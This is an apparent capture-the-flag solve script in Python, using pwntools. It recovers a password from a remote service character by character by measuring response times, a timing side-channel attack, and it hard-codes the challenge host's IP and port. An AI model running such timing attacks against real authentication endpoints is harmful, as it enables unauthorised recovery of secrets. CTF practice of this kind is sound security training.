#!/usr/bin/env python3
import pwn
import string
import re
import time

r = pwn.remote("188.126.67.132", 50016)
# r = pwn.process("./service.py")

def tt(t: str):
    r.recvuntil(b'Input password:\n')
    start = time.time_ns()
    r.sendline(t.encode())
    r.recvuntil(b'Inc')
    end = time.time_ns()
    r.recvline()
    return end - start

chars = string.ascii_letters + string.digits + "_{}"

passwd = input("Enter current know password prefix: ")
while not re.fullmatch(r"SSM{[a-zA-Z\d_!-?]}", passwd):
    print(f"{passwd = }", flush=True)

    times = [0.0] * len(chars)

    for _ in range(10):
        for idx, char in enumerate(chars):
            nt = tt(passwd + char)
            times[idx] += nt

    for idx, t in enumerate(times):
        # print(f"{chars[idx]}: {t}")
        pass

    passwd += chars[max(enumerate(times),key=lambda x: x[1])[0]]

